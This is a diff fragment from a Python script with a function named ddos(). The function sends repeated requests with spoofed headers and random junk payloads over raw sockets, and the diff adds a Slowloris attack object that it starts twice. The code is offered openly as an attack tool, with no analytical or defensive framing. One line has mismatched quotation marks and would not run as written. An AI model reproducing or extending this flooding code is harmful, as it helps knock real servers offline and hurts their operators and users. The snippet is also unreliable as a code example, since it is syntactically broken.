@@ -2459,6 +2459,7 @@ def ddos():
     useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
     url = HostAddress.from_url("("http://" + ip)")
     connections_count = 100
+    loris = SlowLorisAttack(url, connections_count, silent=True)
     request = post_host + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
     data = random._urandom(1067)
     data1 = random._urandom(1166)
@@ -2476,6 +2477,8 @@ def ddos():
             s.sendall(str.encode(request))
             s.sendall(str.encode(request))
             s.sendall(str.encode(request))
+            loris.start()
+            loris.start()
             s.send(data)
             s.send(data)
             s.send(data)
